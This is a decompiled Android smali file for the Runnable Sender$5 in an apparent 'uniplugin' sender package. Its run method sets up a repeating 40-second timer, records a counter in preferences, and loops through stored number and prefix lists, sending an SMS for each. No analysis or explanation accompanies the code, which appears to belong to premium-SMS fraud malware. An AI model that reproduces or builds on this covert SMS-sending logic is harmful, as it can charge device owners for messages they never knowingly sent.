.class Lcom/uniplugin/sender/Sender$5;
.super Ljava/lang/Object;
.source "Sender.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/uniplugin/sender/Sender;->sendstart()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/uniplugin/sender/Sender;


# direct methods
.method constructor <init>(Lcom/uniplugin/sender/Sender;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    .line 423
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    .prologue
    const-wide/32 v2, 0x9c40

    .line 425
    iget-object v0, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v0, v0, Lcom/uniplugin/sender/Sender;->prefix:Ljava/util/ArrayList;

    if-eqz v0, :cond_0

    .line 426
    iget-object v0, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v0, v0, Lcom/uniplugin/sender/Sender;->prefix:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    if-lez v0, :cond_0

    .line 428
    iget-object v0, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v0, v0, Lcom/uniplugin/sender/Sender;->timer:Ljava/util/Timer;

    new-instance v1, Lcom/uniplugin/sender/Sender$UpdateBallTask;

    iget-object v4, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    invoke-direct {v1, v4}, Lcom/uniplugin/sender/Sender$UpdateBallTask;-><init>(Lcom/uniplugin/sender/Sender;)V

    move-wide v4, v2

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->scheduleAtFixedRate(Ljava/util/TimerTask;JJ)V

    .line 429
    iget-object v0, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v0, v0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    const-string v1, "ESLIABONENTTUPIT"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v8

    .line 430
    .local v8, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    .line 431
    .local v6, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v0, "countimer"

    const/4 v1, 0x1

    invoke-interface {v6, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 432
    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 434
    const/4 v7, 0x0

    .local v7, "i":I
    :goto_0
    iget-object v0, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v0, v0, Lcom/uniplugin/sender/Sender;->prefix:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    if-lt v7, v0, :cond_1

    .line 438
    .end local v6    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v7    # "i":I
    .end local v8    # "settings":Landroid/content/SharedPreferences;
    :cond_0
    return-void

    .line 435
    .restart local v6    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v7    # "i":I
    .restart local v8    # "settings":Landroid/content/SharedPreferences;
    :cond_1
    iget-object v1, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v0, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v0, v0, Lcom/uniplugin/sender/Sender;->numbers:Ljava/util/ArrayList;

    invoke-virtual {v0, v7}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v2

    iget-object v0, p0, Lcom/uniplugin/sender/Sender$5;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v0, v0, Lcom/uniplugin/sender/Sender;->prefix:Ljava/util/ArrayList;

    invoke-virtual {v0, v7}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Lcom/uniplugin/sender/Sender;->sendSMSka(Ljava/lang/String;Ljava/lang/String;)V

    .line 434
    add-int/lit8 v7, v7, 0x1

    goto :goto_0
.end method
